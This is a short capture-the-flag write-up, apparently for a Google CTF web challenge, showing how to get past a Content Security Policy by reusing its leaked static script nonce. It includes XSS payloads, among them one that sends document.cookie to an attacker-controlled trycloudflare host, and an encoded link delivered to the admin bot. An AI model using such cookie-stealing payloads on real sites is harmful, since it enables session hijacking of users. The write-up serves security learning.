# falling slowly... again - google ctf - web

This site boasts a defense against XSS, but its security is like a falling leaf – slow and predictable. It relies on a mechanism that, while sound in theory, has a fatal flaw in its execution. Can you exploit this weakness to inject your own malicious code and take control?


When testing for an XSS with the usual 

```
<script>alert()</script>
```

XSS payload, I see that it is loaded into the page but the script doesn't function. Opening up devtools gives us the following CSP error:

```
once-web.2024-bq.ctfcompetition.com/:47 Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' 'nonce-bO4ppxGUAjltHc4UXpjG6ggg'". Either the 'unsafe-inline' keyword, a hash ('sha256-S8S/VNmXuUuoIR6OhqBqwIiIkuCxXq31hCCHAHnicV8='), or a nonce ('nonce-...') is required to enable inline execution.
```

Nonce is like a key that must be presented in order for script to be run inline.

To bypass this, we just have to include the nonce value in the payload:

```
<script nonce=bO4ppxGUAjltHc4UXpjG6ggg>alert()</script>
```

Success:

---

From here, the cookies for the admin seem like the logical place for the flag so I create a new payload that will fetch a domain under my control with the cookie included as part of the request. The payload to first add into the "name" parameter:

```
<script nonce=bO4ppxGUAjltHc4UXpjG6ggg>fetch('https://performer-disagree-nor-agency.trycloudflare.com/'+document.cookie)</script>
```

Next we send the XSS url to the admin:

```
https://once-web.2024-bq.ctfcompetition.com/?name=%3Cscript+nonce%3DbO4ppxGUAjltHc4UXpjG6ggg%3Efetch%28%27https%3A%2F%2Fperformer-disagree-nor-agency.trycloudflare.com%2F%27%2Bdocument.cookie%29%3C%2Fscript%3E
```

And the result from a python listener:

---

# Resources/Learning

- CSP - nonce